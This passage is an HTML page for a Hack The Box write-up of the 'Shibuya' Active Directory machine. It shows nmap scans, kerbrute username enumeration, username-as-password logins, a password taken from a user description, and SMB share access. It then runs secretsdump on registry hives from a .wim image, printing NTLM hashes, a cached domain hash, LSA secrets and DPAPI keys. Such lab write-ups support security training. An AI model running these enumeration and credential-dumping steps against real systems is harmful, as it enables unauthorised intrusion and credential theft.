@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Shibuya | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Hostname setup, Enuumeration, SMB (445)." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-shibuya/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Shibuya" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Hostname setup, Enuumeration, SMB (445)." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-shibuya/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-shibuya/og.png?v=e70c1e20" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Shibuya" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Hostname setup, Enuumeration, SMB (445)." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-shibuya/og.png?v=e70c1e20" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Shibuya","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Hostname setup, Enuumeration, SMB (445).","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-shibuya/","datePublished":"2026-03-31","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Shibuya","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-shibuya/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Shibuya</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-03-31 · 18 min read</p><h1>Shibuya</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers Hostname setup, Enuumeration, SMB (445).</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Shibuya" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-shibuya.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-shibuya.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Shibuya</h2><p>Shibuya is a Hard Windows machine that starts of with the SMB port exposed. Enumerating possible usernames through Kerberos an attacker is able to find the valid machine account red:red. With these credentials, he can further enumerate the remote users and discover that the…</p></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>Released</dt><dd>19 Jun 2025</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>xct</dd></div><div><dt>Rating</dt><dd>4.8 / 5</dd></div><div><dt>User owns</dt><dd>583</dd></div><div><dt>Root owns</dt><dd>489</dd></div><div><dt>User blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 28S</small></dd></div><div><dt>Root blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 28S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 424 votes from easiest to hardest"><rect x="0" y="60" width="20" height="4" rx="2" fill="hsl(96 70% 55%)"><title>8 votes</title></rect><rect x="26" y="62" width="20" height="2" rx="2" fill="hsl(96 70% 55%)"><title>4 votes</title></rect><rect x="52" y="50" width="20" height="14" rx="2" fill="hsl(80 70% 55%)"><title>25 votes</title></rect><rect x="78" y="42" width="20" height="22" rx="2" fill="hsl(70 70% 55%)"><title>40 votes</title></rect><rect x="104" y="0" width="20" height="64" rx="2" fill="hsl(50 70% 55%)"><title>115 votes</title></rect><rect x="130" y="7" width="20" height="57" rx="2" fill="hsl(38 70% 55%)"><title>102 votes</title></rect><rect x="156" y="8" width="20" height="56" rx="2" fill="hsl(28 70% 55%)"><title>100 votes</title></rect><rect x="182" y="53" width="20" height="11" rx="2" fill="hsl(16 70% 55%)"><title>20 votes</title></rect><rect x="208" y="60" width="20" height="4" rx="2" fill="hsl(8 70% 55%)"><title>7 votes</title></rect><rect x="234" y="62" width="20" height="2" rx="2" fill="hsl(0 70% 55%)"><title>3 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 7.4, Real-Life 6.5, CVE 5.8, Custom Exploitation 4.2, CTF-Like 3.5"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,58.2 153.3,95.9 133.9,142.8 92.7,133.8 86.7,102.4" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Shibuya" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Hostname setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.234.42 --generate-hosts-file /etc/hosts      
+[sudo] password for kali: 
+SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><p>This has created me an entry in <code>/etc/hosts</code></p><h2>Enuumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT 10.129.234.42
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 17:13 +0000
+Nmap scan report for 10.129.234.42
+Host is up (0.014s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+9389/tcp  open  adws
+49664/tcp open  unknown
+49668/tcp open  unknown
+50168/tcp open  unknown
+50182/tcp open  unknown
+50200/tcp open  unknown
+50888/tcp open  unknown
+51970/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.34 seconds</code></pre><p>Whats interesting here is that there is SSH (22) open</p><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 22,53,88,135,139,445,464,593,3268,3269,3389,9389 -A --min-rate=2000 -sT AWSJPDC0522.shibuya.vl
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 17:17 +0000
+Nmap scan report for AWSJPDC0522.shibuya.vl (10.129.234.42)
+Host is up (0.015s latency).
+
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-21 17:17:12Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:AWSJPDC0522.shibuya.vl
+| Not valid before: 2026-03-21T17:03:50
+|_Not valid after:  2027-03-21T17:03:50
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shibuya.vl, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:AWSJPDC0522.shibuya.vl
+| Not valid before: 2026-03-21T17:03:50
+|_Not valid after:  2027-03-21T17:03:50
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: SHIBUYA
+|   NetBIOS_Domain_Name: SHIBUYA
+|   NetBIOS_Computer_Name: AWSJPDC0522
+|   DNS_Domain_Name: shibuya.vl
+|   DNS_Computer_Name: AWSJPDC0522.shibuya.vl
+|   DNS_Tree_Name: shibuya.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-03-21T17:17:55+00:00
+|_ssl-date: 2026-03-21T17:18:35+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=AWSJPDC0522.shibuya.vl
+| Not valid before: 2026-03-20T17:12:59
+|_Not valid after:  2026-09-19T17:12:59
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: AWSJPDC0522; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>Not a lot i can do with SSH until i get credentials</p><h2>SMB (445)</h2><p>Null auth is enabled be default on domain controllers Guest account is disabled</p><h2>Valid usernames found with kerbrute</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">kerbrute userenum -d shibuya.vl --dc AWSJPDC0522.shibuya.vl /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 03/21/26 - Ronnie Flathers @ropnop
+
+2026/03/21 17:30:01 &gt;  Using KDC(s):
+2026/03/21 17:30:01 &gt;  	AWSJPDC0522.shibuya.vl:88
+
+2026/03/21 17:30:01 &gt;  [+] VALID USERNAME:	 purple@shibuya.vl
+2026/03/21 17:30:02 &gt;  [+] VALID USERNAME:	 red@shibuya.vl
+2026/03/21 17:30:14 &gt;  [+] VALID USERNAME:	 Purple@shibuya.vl
+2026/03/21 17:30:22 &gt;  [+] VALID USERNAME:	 Red@shibuya.vl
+2026/03/21 17:30:38 &gt;  [+] VALID USERNAME:	 RED@shibuya.vl
+2026/03/21 17:30:38 &gt;  [+] VALID USERNAME:	 PURPLE@shibuya.vl</code></pre><p>Found two users <code>red</code> and <code>purple</code> neither are asrep roastable</p><p>I can try their username as their password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc rdp AWSJPDC0522.shibuya.vl -u red -p &#39;red&#39; -k 
+RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [*] Windows 10 or Windows Server 2016 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl) (nla:True)
+RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [+] shibuya.vl\red:red</code></pre><p>I have successful as <code>red</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc rdp AWSJPDC0522.shibuya.vl -u purple -p &#39;purple&#39; -k
+RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [*] Windows 10 or Windows Server 2016 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl) (nla:True)
+RDP         AWSJPDC0522.shibuya.vl 3389   AWSJPDC0522      [+] shibuya.vl\purple:purple</code></pre><p>Also successful auth as <code>purple</code></p><h2>SMB access as <code>red</code></h2><h3>Shares</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb AWSJPDC0522.shibuya.vl -u red$ -p &#39;red&#39; -k --shares
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [+] shibuya.vl\red$:red 
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [*] Enumerated shares
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Share           Permissions     Remark
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      -----           -----------     ------
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      ADMIN$                          Remote Admin
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      C$                              Default share
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      images$                         
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      IPC$            READ            Remote IPC
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      NETLOGON        READ            Logon server share 
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      SYSVOL          READ            Logon server share 
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      users           READ </code></pre><h3>Users</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb AWSJPDC0522.shibuya.vl -u red$ -p &#39;red&#39; -k --users-export users.txt
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      [+] shibuya.vl\red$:red 
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      _admin                        2025-02-15 07:55:29 0       Built-in account for administering the computer/domain
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      krbtgt                        2025-02-15 07:24:57 0       Key Distribution Center Service Account
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      svc_autojoin                  2025-02-15 07:51:49 0       K5&amp;A6Dw9d8jrKWhV
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Leon.Warren                   2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Graeme.Kerr                   2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Joshua.North                  2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Shaun.Burton                  2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Gillian.Douglas               2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Kelly.Davies                  2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Conor.Fletcher                2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Karl.Brown                    2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Tracey.Wood                   2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Mohamed.Brooks                2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Wendy.Stevenson               2025-02-16 10:23:34 0      
+SMB         AWSJPDC0522.shibuya.vl 445    AWSJPDC0522      Gerald.Allen                  2025-02-16 10:23:34 0 </code></pre><p>I dumped the users there were 503 in total so i have not included them all in the output</p><p>Found what looks like a password in the user description</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">svc_autojoin:K5&amp;A6Dw9d8jrKWhV</code></pre><p>Ill test these creds</p><h2>Compromising <code>svc_autojoin</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb AWSJPDC0522.shibuya.vl -u &#39;svc_autojoin&#39; -p &#39;K5&amp;A6Dw9d8jrKWhV&#39;  
+SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&amp;A6Dw9d8jrKWhV</code></pre><p>Successful authentication</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb AWSJPDC0522.shibuya.vl -u &#39;svc_autojoin&#39; -p &#39;K5&amp;A6Dw9d8jrKWhV&#39; --shares               
+SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&amp;A6Dw9d8jrKWhV 
+SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares
+SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark
+SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------
+SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin
+SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share
+SMB         10.129.234.42   445    AWSJPDC0522      images$         READ            
+SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC
+SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share 
+SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share 
+SMB         10.129.234.42   445    AWSJPDC0522      users           READ </code></pre><p>This user has access to the <code>images$</code> share</p><pre><code>smbclient \\\\AWSJPDC0522.shibuya.vl\\images$ -U &#39;svc_autojoin&#39;%&#39;K5&amp;A6Dw9d8jrKWhV&#39;                            
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Feb 16 11:24:08 2025
+  ..                                DHS        0  Wed Apr  9 01:09:45 2025
+  AWSJPWK0222-01.wim                  A  8264070  Sun Feb 16 11:23:41 2025
+  AWSJPWK0222-02.wim                  A 50660968  Sun Feb 16 11:23:45 2025
+  AWSJPWK0222-03.wim                  A 32065850  Sun Feb 16 11:23:47 2025
+  vss-meta.cab                        A   365686  Sun Feb 16 11:22:37 2025
+
+		5048575 blocks of size 4096. 1565210 blocks available
+smb: \&gt; </code></pre><p>Found some .wim files which ill transfer to my machine</p><p>The second .wim file <code>AWSJPWK0222-02.wim</code> has SAM, SYTEM and SECURITY registry hives</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">secretsdump.py -sam SAM -security SECURITY -system SYSTEM local
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x2e971736685fc53bfd5106d471e2f00f
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dcb5ed323d1d09b9653452027e8c013:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9dc1b36c1e31da7926d77ba67c654ae6:::
+operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20bd63f60f469f6763ca0d50:::
+[*] Dumping cached domain logon information (domain/username:hash)
+SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56+00:00)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:2f006b004e0045004c0045003f0051005800290040004400580060005300520079002600610027002f005c002e002e0053006d0037002200540079005e0044003e004e0056005f00610063003d00270051002e00780075005b0075005c00410056006e004200230066004a0029006f007a002a005700260031005900450064003400240035004b0079004d006f004f002100750035005e0043004e002500430050006e003a00570068005e004e002a0076002a0043005a006c003d00640049002e006d005a002d002d006e0056002000270065007100330062002f00520026006b00690078005b003600670074003900
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1fe837c138d1089c9a0763239cd3cb42
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0xb31a4d81f2df440f806871a8b5f53a15de12acc1
+dpapi_userkey:0xe14c10978f8ee226cbdbcbee9eac18a28b006d06
+[*] NL$KM 
+ 0000   92 B9 89 EF 84 2F D6 55  73 67 31 8F E0 02 02 66   ...../.Usg1....f
+ 0010   F9 81 42 68 8C 3B DF 5D  0A E5 BA F2 4A 2C 43 0E   ..Bh.;.]....J,C.
+ 0020   1C C5 4F 40 1E F5 98 38  2F A4 17 F3 E9 D9 23 E3   ..O@...8/.....#.
+ 0030   D1 49 FE 06 B3 2C A1 1A  CB 88 E4 1D 79 9D AE 97   .I...,......y...
+NL$KM:92b989ef842fd6557367318fe0020266f98142688c3bdf5d0ae5baf24a2c430e1cc54f401ef598382fa417f3e9d923e3d149fe06b32ca11acb88e41d799dae97
